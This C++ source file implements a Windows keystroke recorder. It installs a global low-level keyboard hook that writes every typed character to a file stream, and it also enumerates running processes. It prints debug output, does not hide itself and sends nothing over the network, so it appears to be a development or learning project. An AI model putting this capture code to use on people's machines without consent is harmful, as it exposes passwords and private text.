#include "keystroke_recorder.h"

KeystrokeRecorder *KeystrokeRecorder::instance = nullptr;

#ifdef _WIN32

#include "TlHelp32.h"

HHOOK KeystrokeRecorder::hKeyboardHook = NULL;

LRESULT CALLBACK KeystrokeRecorder::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    std::cout << "Ran" << std::endl;
    if (nCode >= 0)
    {
        // lParam is a pointer to a KBDLLHOOKSTRUCT
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;

        switch (wParam)
        {
        case WM_KEYDOWN:
            wchar_t unicodeBuffer[2] = {0};
            static BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);

            // Check if shift key pressed
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
            {
                keyboardState[VK_SHIFT] |= 0x80;
            }

            if (ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 2, 0) == 1)
            {
                // stream->file.write(static_cast<char *>(unicodeBuffer), 2);

                KeystrokeRecorder::getInstance()->stream->file.write(unicodeBuffer, 2);

                std::wcout << L"Character typed: " << unicodeBuffer[0] << std::endl;
            }

            break;
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void KeystrokeRecorder::enumerateWindowsProcesses() const
{

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        throw std::runtime_error("Failed to create thread snapshot: " + GetLastError());
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe))
    {
        std::cout << "Processes:\n";
        do
        {
            std::cout << ".exe file = " << pe.szExeFile << ", process id = " << pe.th32ProcessID << ", parent process id = " << pe.th32ParentProcessID << ", thread count = " << pe.cntThreads << std::endl;
        } while (Process32Next(hSnapshot, &pe));
    }
    else
    {
        std::cerr << "Failed to retrieve process information!" << std::endl;
    }

    CloseHandle(hSnapshot);
}

#endif

void KeystrokeRecorder::registerRecorder(std::shared_ptr<SnapshotStream> targetStream)
{
    if (!targetStream)
    {
        throw std::runtime_error("Target stream invalid!");
    }

    this->stream = targetStream;

#ifdef _WIN32
    enumerateWindowsProcesses();
    std::cout << "Registering Windows keyboard hook..." << std::endl;

    // We need to get a handle to the module (a loaded .dll or .exe) that contains the hook procedure code
    // Since the hook proc code will exist in the same binary file, we set the module name to null here
    // which returns a handle to the file used to create the calling process (calling process is our app)
    HMODULE hMod = GetModuleHandle(NULL);

    hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL, // Type of hook procedure we want to install (low-level keyboard hook)
        KeyboardProc,   // Pointer to the hook procedure
        hMod,           // Handle to the DLL containing the hook procedure. Tells windows where the code is.
        0               // Identifier of the thread to inject hook proc into. Setting to 0 injects it into all threads running in the same desktop as the calling thread.
    );
    std::cout << "Registered hook: " << hKeyboardHook << std::endl;
#endif
}

void KeystrokeRecorder::unregisterRecorder()
{
#ifdef _WIN32
    if (hKeyboardHook)
    {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
        std::cout << "Unregistered Windows keyboard hook" << std::endl;
    }
    else
    {
        std::cout << "Attempted to unregister Windows keyboard hook, but the hook was already null" << std::endl;
    }
#endif
}

void KeystrokeRecorder::publishData(void *data)
{
}
